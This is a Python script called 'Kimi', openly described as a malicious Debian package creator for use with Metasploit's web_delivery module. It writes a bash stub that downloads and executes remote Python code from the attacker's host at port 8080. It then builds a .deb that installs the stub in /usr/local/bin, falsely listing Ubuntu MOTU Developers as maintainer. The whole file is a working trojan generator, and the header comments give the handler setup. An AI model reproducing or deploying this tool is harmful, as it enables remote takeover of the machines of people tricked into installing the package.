#!/usr/bin/env python

# ____  __. .__             .__  
#|    |/ _| |__|   _____    |__| 
#|      <   |  |  /      \  |  | 
#|    |  \  |  | |  Y Y   \ |  | 
#|____|__ \ |__| |__|_|   / |__| 
#        \/            \./Suspicious Shell Activity     
#        Malicious Debain Package Creator
#        Coded by Chaitanya Haritash
#        Twitter :: @bofheaded

##
# Information :::

#Kimi is a script which generates Malicious debian package for metasploit
#which consists of bash file. the bash file is deployed into "/usr/local/bin/" directory.
#Bash file injects and acts like some system command which when executed by victim 
#and attacker hits with session.

#Kimi basically depends upon web_delivery module and every thing is automated. 
#all the attacker needs is to do following settings :

#NOTE :: This project was made to be integrated with Venom Shellcode Generator 1.0.13.
#	It can be used standalone also all user needs is to change uripath in msf variables

#msf exploit(web_delivery) > set srvhost 192.168.0.102
#srvhost => 192.168.0.102
#msf exploit(web_delivery) > set uripath SecPatch
#uripath => SecPatch
#msf exploit(web_delivery) > set uripath /SecPatch
#uripath => /SecPatch
#msf exploit(web_delivery) > set Lhost 192.168.0.102
#Lhost => 192.168.0.102
#msf exploit(web_delivery) > show options
#msf exploit(web_delivery) > exploit

##

import os,time
import argparse,sys

def printer():
     global banner
     banner = """
 ____  __. .__             .__  
|    |/ _| |__|   _____    |__| 
|      <   |  |  /      \  |  | 
|    |  \  |  | |  Y Y   \ |  | 
|____|__ \ |__| |__|_|   / |__| 
        \/            \./Suspicious Shell Activity     
        Malicious Debain Package Creator
        Coded by Chaitanya Haritash
        Twitter :: @bofheaded         
	"""
def main():
	try:
		print banner
		parser = argparse.ArgumentParser()
		parser.add_argument('-n','--name', help="Name for your package" , required="true")
		parser.add_argument('-l','--lhost', help="LHOST, for Handler" , required="true")
		parser.add_argument('-V','--vers', help="Version for package" , required="true")
		global go
		go = parser.parse_args()
		global h
		global j
		h = str(go.name)
		j = str(go.name)+"_"+str(go.vers)	
		with open(h, "w+") as r:	
			payload = """
#!/bin/bash
python -c "import urllib2; r = urllib2.urlopen('http://"""+str(go.lhost)+""":8080/SecPatch'); exec(r.read());"	

				  """	
			k = r.write(payload)
			print ""
			print "kimi finally done with it ;) happy injecting !!"
			print ""
	except IOError:
		print banner
		print "[-] please provide valid arguments [-]"
		print ""	
	
	#else:
	#	print banner

def make_deb():	
	gen = """
#!/bin/sh
chmod u+x """+h+"""
cat >> control << EOF

Package: """+str(go.name)+"""
Version: """+str(go.vers)+"""
Section: Games and Amusement
Priority: optional
Architecture: i386
Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
Description: whatever u like to add

EOF

mkdir -p """+j+"""/usr/local/bin
cp """+h+""" """+j+"""/usr/local/bin
sleep 2
mkdir -p """+j+"""/DEBIAN
cp control """+j+"""/DEBIAN/control
sleep 3
dpkg-deb --build """+j+"""
sleep 5
rm -rf """+h+"""
rm -rf control
rm -rf """+j+"""
rm -rf fro.sh 
	"""
	er = open("fro.sh" , "w")
	er.write(gen)
	er.close()

	os.system("chmod +x fro.sh")
	os.system("./fro.sh")

if __name__ == '__main__':
	printer()
	main()
	make_deb()
